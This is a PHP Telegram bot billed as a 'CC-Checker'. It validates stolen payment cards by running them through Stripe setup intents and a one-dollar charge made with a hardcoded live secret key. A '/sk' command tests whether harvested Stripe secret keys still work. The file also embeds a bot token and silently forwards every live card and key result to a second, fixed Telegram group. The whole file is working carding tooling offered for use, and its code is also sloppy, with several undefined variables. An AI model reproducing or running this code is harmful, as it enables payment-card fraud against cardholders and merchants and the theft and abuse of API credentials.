<?php
 
$botToken = "1291883418:AAFgI0Funlg5J8EvJ5Nez9v_6etw3MDQmdU";
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
 $e = print_r($update);
 
$chatId = reply_to_message_id;
$chatId = $update["message"]["chat"]["id"];
$chatId = "-85751982";
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];
$info = json_encode($update,JSON_PRETTY_PRINT);

 $cmds11 = "<b>Hey, welcome to this Bot! Below I show you all available commands:</b>%0A%0A<u>Bin lookup:</u> <code>/bin xxxxxx</code>%0A%0A<u>SK-Key Check:</u> <code>/sk sk_live_xxxxxxxxxxxx</code>%0A%0A<u>Card-Check:</u> <code>/stm xxxxxxxxxxxxxxxx|xx|xx|xxx</code>";
 
switch($message) {
       
        case "/start":
                sendMessage($chatId, "Hey! I am a CC-Checker bot with a few extras. Send /cmds for a list of all commands!");
                break;
        case "/cmds":
                sendMessage($chatId, $cmds11);
                break;
                case "/info":
                sendMessage($chatId,$info);
                break;
       
               
       
}
 if (strpos($message, "/bin") === 0) {
        $bin = substr($message, 5);
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$resul = curl_exec($ch);
$result = strtoupper($resul);
$fim = json_decode($result,true);
 $bank = $fim['BANK']['NAME'];
  $country = $fim['COUNTRY']['NAME'];
 $brand = $fim['SCHEME'];
 $type =$fim['TYPE'];
$level =$fim['BRAND'];
$flag = $fim['COUNTRY']['EMOJI'];
 $currency = $fim['country']['currency'];
 $type3 = strtoupper($fim['type']);
$response ='BinData:'.$type1.'-'.$type3.'-'.$country.'-'.$type.' -'.$bank.' BANK '.$flag.'';
$response = '✔️ Valid BIN <b>%0ABRAND: </b>'.$brand.'<b>%0ATYPE: </b>'.$type.'<b>%0ALEVEL: </b>'.$level.'<b>%0ABANK: </b>'.$bank.' <b>%0ACOUNTRY: </b>'.$country.' '.$flag.'%0A<b>CHECKED BY:</b> '.$username.'<b>%0ABOT BY:</b> @teamxcode CyraX';
##++++++++++++++++++++++++++++++++++++++++++++++++++++++++'
                sendMessage($chatId, $response);
                
                
}

if (strpos($message, "/stm") === 0) {
  $d ="I love u baby.$bin";
        $lista = substr($message, 5);
        $i     = explode("|", $lista);
$cc    = $i[0];
$mes    = $i[1];
$ano  = $i[2];
$ano1    = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];


function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

//put you sk_live keys here
$skeys = array(
  1 => 'sk_live_69GKI0saLB8uIEnxzv8VTvRX', 
    ); 
    $skey = array_rand($skeys);
    $sk = $skeys[$skey];


#=====================================================================================================#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];
$emoji = $fim['emoji'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers'); ////To generate customer id
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Alina Rebeckert');
 $f = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
 $time = substr($time, 0, 4);

$id = trim(strip_tags(getstr($f,'"id": "','"')));

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents'); ////To generate payment token [It wont charge]
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[card][cvc]='.$cvv.'');
  $result = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
 $time = substr($time, 0, 4);
 $c = json_decode(curl_exec($ch), true);
curl_close($ch);

 $pam = trim(strip_tags(getstr($result,'"payment_method": "','"')));

  $cvv = trim(strip_tags(getstr($result,'"cvc_check": "','"')));

if ($c["status"] == "succeeded") {
    
    
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    
    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    // $pm = $c["payment_method"];

    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
$result = curl_exec($ch);
 $attachment_to_her = json_decode(curl_exec($ch), true);
    curl_close($ch);
   $attachment_to_her;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '&amount=100&currency=usd&customer='.$id.'');
 $result = curl_exec($ch);


    if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass") {
        
$skresult = "APPROVED!";
$skresponse = "CVV MATCHES!";
    
    } else {
    
$skresult = "UNCHECKED";
$skresponse = "UNAVAILABLE";
    }
    
} 
elseif(strpos($result, '"cvc_check": "pass"')){
$skresult = "DECLINED!";
$skresponse = "RAPED CVV!";
} 
elseif(strpos($result, 'security code is incorrect')){
$skresult = "APPROVED!";
$skresponse = "CCN APPROVED!";
} 
elseif (isset($c["error"])) {
$skresult = "DECLINED!";
$skresponse = ''. $c["error"]["message"] . ' ' . $c["error"]["decline_code"] .'';
}
else {
$skresult = "UNCHECKED";
$skresponse = "GATE FUCKED!";
}


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');

curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');

curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);
$response = '<u>CARD:</u> <code>'.$lista.'</code><u>%0A%0ASTATUS:</u> <b>'.$skresult.'</b>%0A%0A<u>RESPONSE:</u> <b>'.$skresponse.'</b>%0A%0A----- BinData -----<b>%0ABANK: </b>'.$bank.'<b>%0ATYPE: </b>'.$type.'<b>%0ACOUNTRY: </b>'.$country.' '.$emoji.' %0A--------------------<u>%0A%0ACHECKED BY:</u> @'.$username.'<u>%0A%0ATIME TAKEN:</u> <b>'.$time.'s</b><u>%0A%0ABOT BY:</u> @teamxcode CyraX';
        sendMessage($chatId,$response);
        sendMessage1($chatId,$response);

}

elseif (strpos($message, "/sk") === 0) {
	$sec = substr($message, 4);
	$d ="I love u baby $result";
	$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 $result = curl_exec($ch);
 
 if (strpos($result, 'api_key_expired')) {
 	$d ="<b>DEAD KEY<u>%0AKEY:</u> <code>$sec</code> <u>%0AREASON:</u> <code>EXPIRED KEY</code>";
	sendMessage($chatId,$d);
		}
elseif (strpos($result, 'Invalid API Key provided')) {
	$d ="<b>DEAD KEY</b><u>%0AKEY:</u> <code>$sec</code> <u>%0AREASON:</u> <code>INVALID KEY</code>";
	sendMessage($chatId,$d);
	}elseif (strpos($result, 'testmode_charges_only')) {
	$d ="<b>DEAD KEY</b><u>%0AKEY:</u> <code>$sec</code> <u>%0AREASON:</u> <code>testmode_charges_only</code>";
	sendMessage($chatId,$d);
	
	
}elseif (strpos($result, 'test_mode_live_card')) {
	$d ="<b>DEAD KEY</b><u>%0AKEY:</u> <code>$sec</code> <u>%0ARESPONSE:</u> <code>testmode_charges_only</code>";
	sendMessage($chatId,$d);
	
	}elseif (strpos($result, 'error')) {
	$d ="<b>DEAD KEY</b><u>%0AKEY:</u> <code>$sec</code> <u>%0ARESPONSE:</u> <code>An Error occurred...</code>";
	sendMessage($chatId,$d);
	
}else {
    
    $d ="<b>LIVE KEY</b><u>%0AKEY:</u> <code>$sec</code> <u>%0ARESPONSE:</u> <code>SK LIVE!</code>";
    sendMessage($chatId,$d);
	sendMessage1($chatId,$d);
	
}
	
	}
function sendMessage ($chatId, $message) {
       
        $url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
        file_get_contents($url);
       
}
function sendMessage1 ($chatId,$message) {
       
        $url = $GLOBALS[website]."/sendMessage?chat_id=-1001259954911&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
        file_get_contents($url);
        
}
function sendMessage2 ($chatId,$message) {
       
        $url = $GLOBALS[website]."/sendMessage?chat_id=-1001259954911&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
        file_get_contents($url);
        
       
}
 
 
 
 
 
?>